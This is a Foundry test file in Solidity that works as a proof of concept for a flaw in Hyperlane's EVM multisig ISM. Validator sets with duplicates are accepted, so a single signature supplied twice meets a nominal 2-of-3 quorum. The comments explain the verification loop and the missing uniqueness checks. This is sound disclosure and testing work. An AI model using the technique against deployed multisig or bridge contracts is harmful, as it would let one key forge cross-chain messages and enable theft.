// SPDX-License-Identifier: MIT OR Apache-2.0
pragma solidity >=0.8.0;

import {Test} from "forge-std/Test.sol";

import {StaticMessageIdMultisigIsmFactory, StaticMessageIdMultisigIsm} from "contracts/isms/multisig/StaticMultisigIsm.sol";
import {CheckpointLib} from "contracts/libs/CheckpointLib.sol";
import {TypeCasts} from "contracts/libs/TypeCasts.sol";
import {Message} from "contracts/libs/Message.sol";
import {MessageUtils} from "./IsmTestUtils.sol";

/**
 * PoC: a duplicate validator in an EVM multisig ISM set silently collapses the
 * quorum — an "M-of-N" is satisfiable by fewer than M *unique* keys.
 *
 * `AbstractMultisigIsm.verify` walks the validator array with a single
 * monotonically increasing cursor:
 *
 *     for (i = 0; i < threshold; ++i) {
 *         signer = ecrecover(digest, signatureAt(metadata, i));
 *         while (idx < count && signer != validators[idx]) ++idx;
 *         require(idx < count, "!threshold");
 *         ++idx;
 *     }
 *
 * With validators = [A, A, B] and threshold = 2, the *same* signature from A
 * supplied twice matches validators[0] then validators[1], and verify returns
 * true. One key satisfies a nominal 2-of-3.
 *
 * Nothing on the EVM path rejects duplicate sets:
 *   - StaticThresholdAddressSetFactory.deploy: only `0 < threshold <= length`
 *   - AbstractStorageMultisigIsm.setValidatorsAndThreshold: same
 *   - SDK MultisigConfigSchema: `z.object({ validators: z.array(ZHash),
 *     threshold: z.number() })` — no uniqueness refinement
 *
 * Hyperlane's own Sealevel implementation *does* reject this at config time
 * (rust/sealevel/programs/ism/composite-ism/src/processor.rs, validate_config):
 *
 *     // Reject duplicate validators: with [A, A, B] and threshold 2, the
 *     // ascending-index scan in verify_node would accept two sigs from A as
 *     // quorum, collapsing "2-of-3" into "1-of-2 unique".
 *
 * so this is a cross-implementation inconsistency, not a debatable design call.
 */
contract MultisigDuplicateValidator_PoC is Test {
    using TypeCasts for address;

    uint32 constant ORIGIN = 1;
    uint32 constant DESTINATION = 2;
    bytes32 constant MERKLE_TREE_HOOK = bytes32(uint256(0xBEEF));
    bytes32 constant ROOT = bytes32(uint256(0xF00D));
    uint32 constant INDEX = 7;

    StaticMessageIdMultisigIsmFactory factory;

    function setUp() public {
        factory = new StaticMessageIdMultisigIsmFactory();
    }

    function _message() internal pure returns (bytes memory) {
        return
            MessageUtils.formatMessage(
                3,
                0,
                ORIGIN,
                bytes32(uint256(0xA11CE)),
                DESTINATION,
                bytes32(uint256(0xB0B)),
                bytes("payload")
            );
    }

    /// Builds metadata with `sig` repeated `n` times.
    function _metadataRepeating(
        bytes memory sig,
        uint256 n
    ) internal pure returns (bytes memory md) {
        md = abi.encodePacked(MERKLE_TREE_HOOK, ROOT, INDEX);
        for (uint256 i = 0; i < n; i++) {
            md = abi.encodePacked(md, sig);
        }
    }

    // ---------------------------------------------------------------------

    /// Baseline: a clean 2-of-3 set is NOT satisfiable by one key signing twice.
    function test_cleanSet_singleValidatorCannotReachQuorum() public {
        (address a, uint256 pkA) = makeAddrAndKey("validatorA");
        (address b, ) = makeAddrAndKey("validatorB");
        (address c, ) = makeAddrAndKey("validatorC");

        address[] memory validators = new address[](3);
        validators[0] = a;
        validators[1] = b;
        validators[2] = c;

        StaticMessageIdMultisigIsm ism = StaticMessageIdMultisigIsm(
            factory.deploy(validators, 2)
        );

        bytes memory message = _message();
        bytes32 digest = CheckpointLib.digest(
            ORIGIN,
            MERKLE_TREE_HOOK,
            ROOT,
            INDEX,
            Message.id(message)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pkA, digest);
        bytes memory sigA = abi.encodePacked(r, s, v);

        bytes memory metadata = _metadataRepeating(sigA, 2);

        vm.expectRevert("!threshold");
        ism.verify(metadata, message);
    }

    /// The bug: duplicate validator in the set → one key satisfies 2-of-3.
    function test_duplicateValidator_oneKeySatisfiesQuorum() public {
        (address a, uint256 pkA) = makeAddrAndKey("validatorA");
        (address b, ) = makeAddrAndKey("validatorB");

        // Nominally "2-of-3", but A appears twice.
        address[] memory validators = new address[](3);
        validators[0] = a;
        validators[1] = a; // duplicate — accepted by the factory
        validators[2] = b;

        StaticMessageIdMultisigIsm ism = StaticMessageIdMultisigIsm(
            factory.deploy(validators, 2)
        );

        // Sanity: the factory really did accept the duplicate set.
        (address[] memory got, uint8 thr) = ism.validatorsAndThreshold(
            bytes("")
        );
        assertEq(got.length, 3);
        assertEq(got[0], got[1], "duplicate validator stored on-chain");
        assertEq(thr, 2);

        bytes memory message = _message();
        bytes32 digest = CheckpointLib.digest(
            ORIGIN,
            MERKLE_TREE_HOOK,
            ROOT,
            INDEX,
            Message.id(message)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pkA, digest);
        bytes memory sigA = abi.encodePacked(r, s, v);

        // The SAME signature from A, supplied twice.
        bytes memory metadata = _metadataRepeating(sigA, 2);

        assertTrue(
            ism.verify(metadata, message),
            "QUORUM COLLAPSED: one validator satisfied a nominal 2-of-3"
        );
    }
}
